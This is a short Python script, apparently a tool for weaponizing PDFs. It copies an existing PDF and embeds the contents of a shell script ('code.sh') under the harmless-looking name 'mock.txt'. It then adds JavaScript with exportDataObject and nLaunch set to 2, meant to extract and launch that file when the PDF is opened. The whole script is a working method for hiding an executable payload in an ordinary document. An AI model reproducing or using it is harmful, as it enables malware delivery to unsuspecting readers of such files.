from PyPDF2 import PdfFileReader, PdfFileWriter


with open('old.pdf', 'rb') as old,\
        open('new.pdf', 'wb') as new,\
        open('code.sh', 'rb') as att:
    pdf_in = PdfFileReader(old, strict=False)
    pdf_out = PdfFileWriter()

    for i in range(pdf_in.getNumPages()):
        page = pdf_in.getPage(i)
        pdf_out.addPage(page)

    pdf_out.addAttachment('mock.txt', att.readline())
    pdf_out.addJS('this.exportDataObject({cName: "mock.txt",nLaunch: 2});')
    pdf_out.write(new)
